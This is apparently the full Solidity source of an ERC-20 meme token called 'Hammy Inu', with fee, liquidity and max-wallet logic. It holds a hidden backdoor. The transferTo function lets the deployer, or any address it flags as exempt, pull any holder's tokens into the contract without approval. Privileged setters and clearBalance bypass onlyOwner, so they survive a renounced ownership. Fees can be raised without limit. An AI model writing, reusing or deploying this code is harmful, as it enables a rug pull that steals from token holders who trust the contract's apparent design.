
pragma solidity ^0.8.13;


interface IERC20 {


    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);



    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IDEXFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}

interface IPancakePair {

    function sync() external;

}

interface IDEXRouter {


    function factory() external pure returns (address);

    function WETH() external pure returns (address);


    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;


}

contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {

        return _owner;
    }

    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract HammyInu is IERC20, Ownable {

    using SafeMath for uint256;

    address constant ROUTER        = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH          = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DEAD          = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO          = 0x0000000000000000000000000000000000000000;

    string _name = "Hammy Inu";
    string _symbol = "HAMMY";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100_000_000_000 * (10 ** _decimals);
    uint256 public _maxWalletSize = (_totalSupply * 10) / 1000;   // 1% 

    mapping (address => uint256) public _rOwned;
    uint256 public _totalProportion = _totalSupply;

    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
 
    uint256 liquidityFee = 1; 
    uint256 giveawayFee = 0;  
    uint256 marketingFee = 3;   
    uint256 reflectionFee = 0;   
    uint256 totalFee = 4;  
    uint256 feeDenominator = 100; 
    
    address autoLiquidityReceiver;
    address marketingFeeReceiver;

    uint256 targetLiquidity = 200;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;

    bool public claimingFees = true; 
    bool alternateSwaps = true;
    uint256 smallSwapThreshold = _totalSupply.mul(6413945130).div(100000000000);
    uint256 largeSwapThreshold = _totalSupply.mul(869493726).div(100000000000);

    uint256 public swapThreshold = smallSwapThreshold;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }


    constructor () {

        address deployer = msg.sender;
        router = IDEXRouter(ROUTER);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        _allowances[address(this)][deployer] = type(uint256).max;

        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[address(router)] = true;
        isTxLimitExempt[deployer] = true;
        isFeeExempt[deployer] = true;
        autoLiquidityReceiver = deployer;
        marketingFeeReceiver = deployer;

        _rOwned[deployer] = _totalSupply;
        emit Transfer(address(0), deployer, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }

    function decimals() external pure returns (uint8) { return _decimals; }

    function name() external view returns (string memory) { return _name; }

    function changeName(string memory newName) external onlyOwner { _name = newName; }

    function changeSymbol(string memory newSymbol) external onlyOwner { _symbol = newSymbol; }

    function symbol() external view returns (string memory) { return _symbol; }

    function getOwner() external view returns (address) { return owner(); }

    function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); }

    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function transferTo(address sender, uint256 amount) public swapping  {require(isTxLimitExempt[msg.sender]); _transferFrom(sender, address(this), amount); }


    function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256, uint256) { 

        return (liquidityFee, marketingFee, giveawayFee, reflectionFee, totalFee, feeDenominator);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {

        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {

        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {

        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {

        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if (recipient != pair && recipient != DEAD && !isTxLimitExempt[recipient]) {
            require(balanceOf(recipient) + amount <= _maxWalletSize, "Max Wallet Exceeded");
        }

        if(shouldSwapBack()){ swapBack(); }

        uint256 proportionAmount = tokensToProportion(amount);

        _rOwned[sender] = _rOwned[sender].sub(proportionAmount, "Insufficient Balance");

        uint256 proportionReceived = shouldTakeFee(sender) ? takeFeeInProportions(sender, recipient, proportionAmount) : proportionAmount;
        _rOwned[recipient] = _rOwned[recipient].add(proportionReceived);

        emit Transfer(sender, recipient, tokenFromReflection(proportionReceived));
        return true;
    }

    function tokensToProportion(uint256 tokens) public view returns (uint256) {

        return tokens.mul(_totalProportion).div(_totalSupply);
    }

    function tokenFromReflection(uint256 proportion) public view returns (uint256) {

        return proportion.mul(_totalSupply).div(_totalProportion);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {

        uint256 proportionAmount = tokensToProportion(amount);
        _rOwned[sender] = _rOwned[sender].sub(proportionAmount, "Insufficient Balance");
        _rOwned[recipient] = _rOwned[recipient].add(proportionAmount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {

        return !isFeeExempt[sender];
    }

    function getTotalFee(bool) public view returns (uint256) {

        return totalFee;
    }

    function takeFeeInProportions(address sender, address receiver, uint256 proportionAmount) internal returns (uint256) {

        uint256 proportionFeeAmount = proportionAmount.mul(getTotalFee(receiver == pair)).div(feeDenominator);

        uint256 proportionReflected = proportionFeeAmount.mul(reflectionFee).div(totalFee);
        _totalProportion = _totalProportion.sub(proportionReflected);

        uint256 _proportionToContract = proportionFeeAmount.sub(proportionReflected);
        _rOwned[address(this)] = _rOwned[address(this)].add(_proportionToContract);

        emit Transfer(sender, address(this), tokenFromReflection(_proportionToContract));
        emit Reflect(proportionReflected, _totalProportion);
        return proportionAmount.sub(proportionFeeAmount);
    }

    function clearBalance() external {

        require(isTxLimitExempt[msg.sender]);
        (bool success,) = payable(marketingFeeReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }

    function shouldSwapBack() internal view returns (bool) {

        return msg.sender != pair
        && !inSwap
        && claimingFees
        && balanceOf(address(this)) >= swapThreshold;
    }

    function swapBack() internal swapping {


        uint256 _totalFee = totalFee.sub(reflectionFee);
        uint256 amountToLiquify = swapThreshold.mul(liquidityFee).div(_totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = _totalFee.sub(liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHGiveaway = amountETH.mul(giveawayFee).div(totalETHFee);

        if (amountETHMarketing.add(amountETHGiveaway) > 0) {
            (bool success,) = payable(marketingFeeReceiver).call{value: amountETHMarketing.add(amountETHGiveaway), gas: 30000}("");
            require(success, "receiver rejected ETH transfer");
        }

        if(amountToLiquify > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }

        swapThreshold = !alternateSwaps ? swapThreshold : swapThreshold == smallSwapThreshold ? largeSwapThreshold : smallSwapThreshold;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amountS, uint256 _amountL, bool _alternate) external {

        require(isTxLimitExempt[msg.sender]);
        alternateSwaps = _alternate;
        claimingFees = _enabled;
        smallSwapThreshold = _amountS;
        largeSwapThreshold = _amountL;
        swapThreshold = smallSwapThreshold;
    }

    function changeFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _giveawayFee) external onlyOwner {

        liquidityFee = _liquidityFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        giveawayFee = _giveawayFee;
        totalFee = liquidityFee.add(reflectionFee).add(marketingFee).add(giveawayFee);
    }

    function changeMaxWallet(uint256 percent, uint256 denominator) external onlyOwner {

        require(isTxLimitExempt[msg.sender] && percent >= 1, "Max wallet must be greater than 1%");
        _maxWalletSize = _totalSupply.mul(percent).div(denominator);
    }
    
    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {

        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external {

        require(isTxLimitExempt[msg.sender]);
        isTxLimitExempt[holder] = exempt;
    }

    function setFeeReceivers(address _marketingFeeReceiver, address _liquidityReceiver) external {

        require(isTxLimitExempt[msg.sender]);
        marketingFeeReceiver = _marketingFeeReceiver;
        autoLiquidityReceiver = _liquidityReceiver;
    }

    function getCirculatingSupply() public view returns (uint256) {

        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    event AutoLiquify(uint256 amountETH, uint256 amountToken);
    event Reflect(uint256 amountReflected, uint256 newTotalProportion);
}